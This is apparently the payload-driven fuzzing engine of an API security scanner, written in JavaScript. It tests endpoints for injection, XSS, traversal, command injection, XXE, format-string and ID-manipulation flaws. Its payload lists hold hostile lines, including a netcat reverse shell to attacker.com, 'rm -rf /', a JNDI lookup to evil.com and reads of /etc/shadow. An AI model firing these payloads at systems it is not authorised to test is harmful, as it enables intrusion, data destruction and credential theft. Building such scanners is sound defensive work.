const axios = require('axios');

class FuzzingEngine {
  constructor() {
    this.payloads = {
      injection: [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL--",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
        "eval('alert(1)')",
        "1;EXEC xp_cmdshell('dir')",
        "1' AND 1=1 UNION SELECT username, password FROM users--"
      ],
      xss: [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert('xss')",
        "<svg onload=alert(1)>",
        "'><script>alert(1)</script>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<object data='javascript:alert(1)'></object>",
        "<embed src='javascript:alert(1)'></embed>"
      ],
      traversal: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/var/log/apache2/access.log",
        "/var/www/html/index.php"
      ],
      command: [
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(cat /etc/passwd)",
        "; rm -rf /",
        "| nc -e /bin/sh attacker.com 4444"
      ],
      xxe: [
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/malicious.dtd'>]><foo>&xxe;</foo>",
        "<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]><data>&file;</data>"
      ],
      'format-string': [
        "%s%s%s%s%s%s%s%s%s%s",
        "%x%x%x%x%x%x%x%x%x%x",
        "%n%n%n%n%n%n%n%n%n%n",
        "%p%p%p%p%p%p%p%p%p%p",
        "%d%d%d%d%d%d%d%d%d%d"
      ]
    };
  }

  async fuzzEndpoint(targetUrl, endpoint, authentication = {}, options = {}) {
    const findings = [];
    const { categories = ['injection', 'xss'], maxPayloads = 50, timeout = 10000 } = options;

    const fullUrl = endpoint.fullUrl || `${targetUrl}${endpoint.path}`;

    for (const category of categories) {
      if (!this.payloads[category]) continue;

      const payloads = this.payloads[category].slice(0, maxPayloads);

      for (const payload of payloads) {
        try {
          const result = await this.testPayload(fullUrl, endpoint.method, payload, authentication, timeout);

          if (this.isVulnerable(result, category, payload)) {
            findings.push({
              type: this.getVulnType(category),
              category,
              severity: this.getSeverity(category),
              description: `Potential ${category} vulnerability detected`,
              endpoint: `${endpoint.method} ${endpoint.path}`,
              evidence: {
                request: {
                  method: endpoint.method,
                  url: fullUrl,
                  body: payload
                },
                response: {
                  statusCode: result.status,
                  body: result.data?.substring(0, 500) || '',
                  responseTime: result.responseTime
                },
                payload
              },
              cweId: this.getCWE(category),
              owaspCategory: this.getOWASP(category)
            });
          }
        } catch (error) {
          // Network errors are expected, continue testing
          if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') {
            continue;
          }
        }
      }
    }

    return findings;
  }

  async testPayload(url, method, payload, authentication, timeout) {
    const startTime = Date.now();

    const config = {
      method: method.toLowerCase(),
      url,
      timeout,
      validateStatus: () => true, // Don't throw on any status code
      headers: {
        'User-Agent': 'APIShield-Fuzzer/1.0',
        'Content-Type': 'application/json'
      }
    };

    // Add authentication
    if (authentication.type === 'bearer' && authentication.token) {
      config.headers['Authorization'] = `Bearer ${authentication.token}`;
    } else if (authentication.type === 'apiKey') {
      const location = authentication.apiKeyLocation || 'header';
      const name = authentication.apiKeyName || 'X-API-Key';
      if (location === 'header') {
        config.headers[name] = authentication.apiKey;
      } else if (location === 'query') {
        config.params = config.params || {};
        config.params[name] = authentication.apiKey;
      }
    }

    // Add payload to request
    if (method === 'GET' || method === 'DELETE') {
      config.params = config.params || {};
      config.params.test = payload; // Add as query parameter
    } else {
      config.data = { test: payload }; // Add in request body
    }

    try {
      const response = await axios(config);
      const responseTime = Date.now() - startTime;

      return {
        status: response.status,
        data: response.data,
        headers: response.headers,
        responseTime
      };
    } catch (error) {
      const responseTime = Date.now() - startTime;
      return {
        status: error.response?.status || 0,
        data: error.response?.data || error.message,
        headers: error.response?.headers || {},
        responseTime,
        error: true
      };
    }
  }

  isVulnerable(result, category, payload) {
    const responseText = typeof result.data === 'string' ? result.data.toLowerCase() : JSON.stringify(result.data).toLowerCase();

    switch (category) {
      case 'injection':
        return responseText.includes('syntax error') ||
               responseText.includes('mysql') ||
               responseText.includes('postgresql') ||
               responseText.includes('sqlite') ||
               responseText.includes('oracle') ||
               responseText.includes('sql') ||
               (result.status === 500 && responseText.includes('error'));

      case 'xss':
        return responseText.includes(payload.toLowerCase()) ||
               responseText.includes('alert(') ||
               responseText.includes('script') ||
               responseText.includes('<script');

      case 'traversal':
        return responseText.includes('root:') ||
               responseText.includes('/etc/passwd') ||
               responseText.includes('system32') ||
               responseText.includes('boot.ini') ||
               result.status === 200 && responseText.length > 1000;

      case 'command':
        return responseText.includes('uid=') ||
               responseText.includes('gid=') ||
               responseText.includes('total ') ||
               responseText.includes('drwxr');

      case 'xxe':
        return responseText.includes('root:') ||
               responseText.includes('/etc/passwd') ||
               result.status === 200 && responseText.includes('entity');

      case 'format-string':
        return responseText.includes('(null)') ||
               responseText.includes('0x') ||
               result.status === 500;

      default:
        return false;
    }
  }

  getVulnType(category) {
    const types = {
      injection: 'SQL_INJECTION',
      xss: 'XSS',
      traversal: 'PATH_TRAVERSAL',
      command: 'COMMAND_INJECTION',
      xxe: 'XXE',
      'format-string': 'FORMAT_STRING'
    };
    return types[category] || 'UNKNOWN';
  }

  getSeverity(category) {
    const severities = {
      injection: 'critical',
      xss: 'high',
      traversal: 'high',
      command: 'critical',
      xxe: 'high',
      'format-string': 'medium'
    };
    return severities[category] || 'medium';
  }

  getCWE(category) {
    const cwes = {
      injection: 'CWE-89',
      xss: 'CWE-79',
      traversal: 'CWE-22',
      command: 'CWE-78',
      xxe: 'CWE-611',
      'format-string': 'CWE-134'
    };
    return cwes[category] || 'CWE-200';
  }

  getOWASP(category) {
    const owasp = {
      injection: 'owasp-api-8',
      xss: 'owasp-api-8',
      traversal: 'owasp-api-8',
      command: 'owasp-api-8',
      xxe: 'owasp-api-8',
      'format-string': 'owasp-api-8'
    };
    return owasp[category] || 'owasp-api-8';
  }

  getPayloads(category) {
    return this.payloads[category] || [];
  }

  async testParameterTampering(targetUrl, endpoint, authentication) {
    const findings = [];
    const originalParams = endpoint.parameters || [];

    if (originalParams.length === 0) return findings;

    // Test each parameter for tampering
    for (const param of originalParams) {
      if (param.in === 'path') {
        // Test ID manipulation (BOLA)
        const tamperedValues = [
          '0',
          '-1',
          '999999',
          '../admin',
          'null',
          'undefined'
        ];

        for (const tamperedValue of tamperedValues) {
          try {
            const testUrl = targetUrl.replace(`:${param.name}`, tamperedValue);
            const result = await this.testPayload(testUrl, endpoint.method, '', authentication, 5000);

            if (result.status === 200 && result.data !== 'Not found' && result.data !== 'Unauthorized') {
              findings.push({
                type: 'BOLA',
                category: 'business-logic',
                severity: 'high',
                description: `Parameter '${param.name}' may be vulnerable to ID manipulation`,
                endpoint: `${endpoint.method} ${endpoint.path}`,
                evidence: {
                  request: { method: endpoint.method, url: testUrl },
                  response: { statusCode: result.status, body: result.data?.substring(0, 200) },
                  payload: tamperedValue
                },
                cweId: 'CWE-639',
                owaspCategory: 'owasp-api-1'
              });
            }
          } catch (error) {
            // Continue testing
          }
        }
      }
    }

    return findings;
  }
}

module.exports = new FuzzingEngine();
